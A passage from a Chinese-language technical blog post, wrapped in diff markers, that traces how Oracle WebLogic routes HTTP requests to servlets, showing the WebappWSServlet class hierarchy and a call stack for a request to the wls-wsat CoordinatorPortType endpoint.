+<p>即调用<code>this.servlet.service</code>。由上一小节分析可知，这里的servlet为<code>weblogic.wsee.server.servlet.WebappWSServlet</code>。而<code>WebappWSServlet</code>的类关系如下：</p>
+<p><code>WebappWSServlet</code>  —&gt; <code>BaseWSServlet</code> —&gt; <code>HttpServlet</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebappWSServlet</span> <span class="keyword">extends</span> <span class="title">BaseWSServlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WebappWSServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DeployInfo <span class="title">loadDeployInfo</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ServletDeployInfo.load(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>信息 12</p>
+<p>这也是我们在<code>信息2</code>中看到<code>BaseWSServlet</code>和<code>HttpServlet</code>，而没有看到<code>WebappWSServlet</code>的原因。</p>
+<p>剩下的就是<code>BaseWSServlet</code>自己的请求包处理逻辑了。略过。</p>
+<p>这里再附上另一个例子供对比参考：</p>
+<p>请求：<a href="http://172.16.100.97:7001/wls-wsat/CoordinatorPortType" target="_blank" rel="noopener">http://172.16.100.97:7001/wls-wsat/CoordinatorPortType</a></p>
+<p>栈：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">processRequest:<span class="number">38</span>, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)</span><br><span class="line">__doRun:<span class="number">866</span>, Fiber (com.sun.xml.ws.api.pipe)</span><br><span class="line">_doRun:<span class="number">815</span>, Fiber (com.sun.xml.ws.api.pipe)</span><br><span class="line">doRun:<span class="number">778</span>, Fiber (com.sun.xml.ws.api.pipe)</span><br><span class="line">runSync:<span class="number">680</span>, Fiber (com.sun.xml.ws.api.pipe)</span><br><span class="line">process:<span class="number">403</span>, WSEndpointImpl$<span class="number">2</span> (com.sun.xml.ws.server)</span><br><span class="line">handle:<span class="number">539</span>, HttpAdapter$HttpToolkit (com.sun.xml.ws.transport.http)</span><br><span class="line">handle:<span class="number">253</span>, HttpAdapter (com.sun.xml.ws.transport.http)</span><br><span class="line">handle:<span class="number">140</span>, ServletAdapter (com.sun.xml.ws.transport.http.servlet)</span><br><span class="line">handle:<span class="number">171</span>, WLSServletAdapter (weblogic.wsee.jaxws)</span><br><span class="line">run:<span class="number">708</span>, HttpServletAdapter$AuthorizedInvoke (weblogic.wsee.jaxws)</span><br><span class="line">doAs:<span class="number">363</span>, AuthenticatedSubject (weblogic.security.acl.internal)</span><br><span class="line">runAs:<span class="number">146</span>, SecurityManager (weblogic.security.service)</span><br><span class="line">authenticatedInvoke:<span class="number">103</span>, ServerSecurityHelper (weblogic.wsee.util)</span><br><span class="line">run:<span class="number">311</span>, HttpServletAdapter$<span class="number">3</span> (weblogic.wsee.jaxws)</span><br><span class="line">post:<span class="number">336</span>, HttpServletAdapter (weblogic.wsee.jaxws)</span><br><span class="line">doRequest:<span class="number">99</span>, JAXWSServlet (weblogic.wsee.jaxws)</span><br><span class="line">service:<span class="number">99</span>, AbstractAsyncServlet (weblogic.servlet.http)</span><br><span class="line">service:<span class="number">820</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">run:<span class="number">227</span>, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)</span><br><span class="line">invokeServlet:<span class="number">125</span>, StubSecurityHelper (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">301</span>, ServletStubImpl (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">184</span>, ServletStubImpl (weblogic.servlet.internal)</span><br><span class="line">wrapRun:<span class="number">3732</span>, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)</span><br><span class="line">run:<span class="number">3696</span>, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)</span><br><span class="line">doAs:<span class="number">321</span>, AuthenticatedSubject (weblogic.security.acl.internal)</span><br><span class="line">runAs:<span class="number">120</span>, SecurityManager (weblogic.security.service)</span><br><span class="line">securedExecute:<span class="number">2273</span>, WebAppServletContext (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">2179</span>, WebAppServletContext (weblogic.servlet.internal)</span><br><span class="line">run:<span class="number">1490</span>, ServletRequestImpl (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">256</span>, ExecuteThread (weblogic.work)</span><br><span class="line">run:<span class="number">221</span>, ExecuteThread (weblogic.work)</span><br></pre></td></tr></table></figure>
+
+<p>信息 13</p>
+<p>可以看到，对应这个请求，响应的是<code>JAXWSServlet</code>这个servlet了。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文主要介绍了weblogic下的http请求，包括请求的内部生成逻辑和响应逻辑。</p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/posts/">Writing</a></li>
+         
+          <li><a href="http://github.com/sergodeeva" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#问题描述"><span class="toc-number">1.</span> <span class="toc-text">问题描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#路径分析"><span class="toc-number">2.</span> <span class="toc-text">路径分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#请求生成路径分析"><span class="toc-number">2.1.</span> <span class="toc-text">请求生成路径分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#请求消费路径分析"><span class="toc-number">2.2.</span> <span class="toc-text">请求消费路径分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/" target="_blank" rel="noopener"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&text=weblogic/Weblogic请求包路径分析" target="_blank" rel="noopener"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&title=weblogic/Weblogic请求包路径分析" target="_blank" rel="noopener"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&is_video=false&description=weblogic/Weblogic请求包路径分析" target="_blank" rel="noopener"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=weblogic/Weblogic请求包路径分析&body=Check out this article: http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&title=weblogic/Weblogic请求包路径分析" target="_blank" rel="noopener"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&title=weblogic/Weblogic请求包路径分析" target="_blank" rel="noopener"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&title=weblogic/Weblogic请求包路径分析" target="_blank" rel="noopener"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&title=weblogic/Weblogic请求包路径分析" target="_blank" rel="noopener"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%E8%AF%B7%E6%B1%82%E5%8C%85%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90/&name=weblogic/Weblogic请求包路径分析&description=" target="_blank" rel="noopener"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Homer
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/posts/">Writing</a></li>
+         
+          <li><a href="http://github.com/sergodeeva" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Google Analytics -->
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-37473492-6', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+
+
